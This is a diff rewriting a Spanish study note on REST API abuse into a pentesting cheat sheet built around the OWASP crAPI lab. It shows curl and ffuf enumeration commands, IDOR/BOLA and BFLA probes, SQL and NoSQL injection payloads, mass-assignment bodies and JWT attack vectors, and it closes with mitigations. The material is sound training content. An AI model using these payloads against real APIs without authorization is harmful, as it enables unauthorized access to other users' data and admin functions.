@@ -1,60 +1,184 @@
----
-tags:
-  - Web
-  - Explotacion
-  - APIs
----
+# Abuso de APIs REST
 
-
-# Notas
-
-
-
-
-# Hack4u
+Una **API** (*Application Programming Interface*) es un conjunto de endpoints que permiten la comunicación entre aplicaciones. Las APIs REST son las más comunes en entornos web actuales y, cuando están mal aseguradas, presentan una superficie de ataque significativa.
 
 ---
 
-**Actualización 24/05/2023**: Si a la hora de desplegar el laboratorio con Docker, os encontráis con problemas y alguno de los contenedores que se despliegan véis que causan error, probad a desplegar como alternativa el laboratorio de desarrollo.
+## Conceptos básicos
 
-Primeramente instalad la última versión de ‘**docker-compose**‘ y una vez hecho, ejecutad los siguientes comandos:
+Una API REST expone recursos a través de URLs y métodos HTTP:
 
-- **curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml**
-- **VERSION=develop docker-compose pull**
-- **VERSION=develop docker-compose -f docker-compose.yml –compatibility up -d**
+| Método | Acción típica |
+|---|---|
+| `GET` | Leer/listar recursos |
+| `POST` | Crear un nuevo recurso |
+| `PUT` / `PATCH` | Actualizar un recurso existente |
+| `DELETE` | Eliminar un recurso |
 
-En caso de que veáis que tras desplegar el laboratorio, siguen habiendo errores en el despliegue de ciertos contenedores, probad a hacer un ‘**docker rm $(docker ps -a -q) –force**‘ y aplicad el último comando de los 3 mencionados anteriormente para volver a desplegar los contenedores. Llegará un momento en el que todos serán desplegados sin ningún problema.
-
-Por otro lado, si de pronto véis que el comando ‘**docker rm $(docker ps -a -q) –force**‘ os da algún problema, esperad unos segundos y volved a probar el comando hasta que veáis que todos los contenedores han sido eliminados.
+El primer paso en el abuso de APIs es la **enumeración**: descubrir qué endpoints existen y qué métodos aceptan.
 
 ---
 
-Cuando hablamos del abuso de APIs, a lo que nos referimos es a la explotación de vulnerabilidades en las interfaces de programación de aplicaciones (**APIs**) que se utilizan para permitir la comunicación y el intercambio de datos entre diferentes aplicaciones y servicios en una red.
+## Herramientas
 
-Un ejemplo sencillo de API podría ser la integración de Google Maps en una aplicación de transporte. Imagina que una aplicación de transporte necesita mostrar el mapa y la ruta a seguir para que los usuarios puedan ver la ubicación del vehículo y el camino que se va a seguir para llegar a su destino. En lugar de crear su propio mapa, la aplicación podría utilizar la API de Google Maps para mostrar el mapa en su aplicación.
+### Postman
 
-En este ejemplo, la API de Google Maps proporciona una serie de funciones y protocolos que permiten a la aplicación de transporte comunicarse con los servidores de Google y acceder a los datos necesarios para mostrar el mapa y la ruta. La API de Google Maps también maneja la complejidad de mostrar el mapa y la ruta en diferentes dispositivos y navegadores, lo que permite a la aplicación de transporte centrarse en su funcionalidad principal.
+Interfaz gráfica para construir, enviar y analizar peticiones HTTP/HTTPS a APIs. Permite:
+- Gestionar colecciones de requests
+- Configurar autenticación (Bearer tokens, API keys, OAuth)
+- Encadenar peticiones con variables de entorno
 
-Adicionalmente, una de las utilidades que vemos en esta clase es **Postman**. Postman es una herramienta muy popular utilizada para probar y depurar APIs. Con Postman, los desarrolladores pueden enviar solicitudes a diferentes endpoints y ver las respuestas para verificar que la API está funcionando correctamente. Sin embargo, los atacantes también pueden utilizar Postman para explorar los endpoints de una API en busca de vulnerabilidades y debilidades de seguridad.
+### curl
 
-Algunos endpoints de una API pueden aceptar diferentes métodos de solicitud, como GET, POST, PUT, DELETE, etc. Los atacantes pueden utilizar herramientas de fuzzing para enviar una gran cantidad de solicitudes a un endpoint en busca de vulnerabilidades. Por ejemplo, un atacante podría enviar solicitudes GET a un endpoint para enumerar todos los recursos disponibles, o enviar solicitudes POST para agregar o modificar datos.
+Para interacciones rápidas desde terminal:
+```bash
+# GET básico
+curl -s https://api.target.com/v1/users
 
-Algunas de las vulnerabilidades comunes que se pueden explotar a través del abuso de APIs incluyen:
+# POST con JSON
+curl -s -X POST https://api.target.com/v1/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"test"}'
 
-- **Inyección de SQL**: los atacantes pueden enviar datos maliciosos en las solicitudes para intentar inyectar código SQL en la base de datos subyacente.
-- **Falsificación de solicitudes entre sitios (CSRF)**: los atacantes pueden enviar solicitudes maliciosas a una API en nombre de un usuario autenticado para realizar acciones no autorizadas.
-- **Exposición de información confidencial**: los atacantes pueden explorar los endpoints de una API para obtener información confidencial, como claves de API, contraseñas y nombres de usuario.
+# Con token de autenticación
+curl -s https://api.target.com/v1/profile \
+  -H "Authorization: Bearer eyJhbGci..."
 
-Para evitar el abuso de APIs, los desarrolladores deben asegurarse de que la API esté diseñada de manera segura y que se validen y autentiquen adecuadamente todas las solicitudes entrantes. También es importante utilizar cifrado y autenticación fuertes para proteger los datos que se transmiten a través de la API.
+# Seguir redirecciones + mostrar headers
+curl -sv https://api.target.com/v1/users
+```
 
-Los desarrolladores pueden utilizar herramientas como Postman para probar la API y detectar posibles vulnerabilidades antes de que sean explotadas por los atacantes.
+---
 
-A continuación, se proporciona el enlace al proyecto de Github que utilizamos para desplegar con Docker el laboratorio vulnerable donde poder practicar la enumeración de APIs:
+## Fase de reconocimiento
 
-- **crAPI**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
+### 1. Descubrir endpoints
 
-# Laboratorios
+Muchas APIs exponen documentación automática:
+```
+/api/docs
+/api/swagger
+/swagger.json
+/openapi.json
+/v1/docs
+/redoc
+```
 
-A continuación, se proporciona el enlace al proyecto de Github que utilizamos para desplegar con Docker el laboratorio vulnerable donde poder practicar la enumeración de APIs:
+### 2. Fuzzing de endpoints con ffuf
 
-- **crAPI**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
+```bash
+# Enumerar rutas de la API
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -u https://target.com/api/FUZZ \
+  -mc 200,201,204,301,302,401,403
+
+# Enumerar versiones de API
+ffuf -w version_list.txt -u https://target.com/FUZZ/users -mc 200
+```
+
+### 3. Métodos HTTP no esperados
+
+Probar todos los métodos en cada endpoint:
+```bash
+for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
+  echo -n "$method: "
+  curl -s -o /dev/null -w "%{http_code}" -X $method https://api.target.com/v1/users
+  echo
+done
+```
+
+---
+
+## Vulnerabilidades comunes en APIs
+
+### BOLA — Broken Object Level Authorization (IDOR)
+
+El atacante cambia el ID de un objeto en la petición para acceder a datos de otro usuario:
+
+```bash
+# Usuario accede a su propio perfil
+GET /api/v1/users/1337/profile
+
+# Prueba BOLA: acceder al perfil de otro usuario
+GET /api/v1/users/1/profile
+GET /api/v1/users/2/profile
+```
+
+### Exposición de información excesiva
+
+Comparar la respuesta del endpoint para el propio usuario vs lo que devuelve para otros. A veces los campos sensibles (email, teléfono, rol) se devuelven aunque no deberían ser accesibles.
+
+### Inyección SQL / NoSQL en parámetros JSON
+
+```bash
+curl -s -X GET "https://api.target.com/v1/users?id=1 OR 1=1--"
+curl -s -X POST https://api.target.com/v1/search \
+  -d '{"username": {"$ne": null}}'
+```
+
+### Mass Assignment
+
+Enviar campos adicionales en el body que la API podría aplicar sin validación:
+
+```json
+{"username": "victima", "role": "admin", "verified": true}
+```
+
+### BFLA — Broken Function Level Authorization
+
+Acceder a funciones de administración sin tener el rol adecuado:
+```bash
+# Endpoint de admin sin autenticación elevada
+GET /api/v1/admin/users
+DELETE /api/v1/admin/users/5
+```
+
+---
+
+## Autenticación y tokens
+
+### JWT (JSON Web Tokens)
+
+Decodificar un JWT para ver su contenido (no requiere la clave):
+```bash
+# El JWT tiene 3 partes separadas por '.': header.payload.signature
+echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
+```
+
+Vectores de ataque:
+- **Algorithm: none** — cambiar el header a `{"alg":"none"}` y eliminar la firma
+- **Fuerza bruta del secret** con `hashcat` o `jwt_tool`
+- **Confusión RS256 → HS256** — firmar con la clave pública como si fuera simétrica
+
+### API Keys expuestas
+
+Buscar en repositorios, archivos JavaScript del frontend, respuestas de la propia API:
+```bash
+# Buscar en el código JS del sitio
+curl -s https://target.com/app.js | grep -i "api_key\|apikey\|secret\|token"
+```
+
+---
+
+## Laboratorio para practicar
+
+- **crAPI** (Completely Ridiculous API): [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
+
+```bash
+# Despliegue con Docker Compose (rama develop para mayor compatibilidad)
+curl -o docker-compose.yml \
+  https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml
+VERSION=develop docker-compose pull
+VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d
+```
+
+---
+
+## Mitigaciones
+
+- Implementar autorización a nivel de objeto en cada endpoint (no asumir que el token es suficiente)
+- Rate limiting y throttling para prevenir enumeración y fuerza bruta
+- Validar y filtrar todos los campos del body — no confiar en mass assignment
+- Ocultar o deshabilitar la documentación automática en producción
+- Rotar y revocar tokens comprometidos
+- Auditar regularmente los endpoints con herramientas como OWASP ZAP o Burp Suite
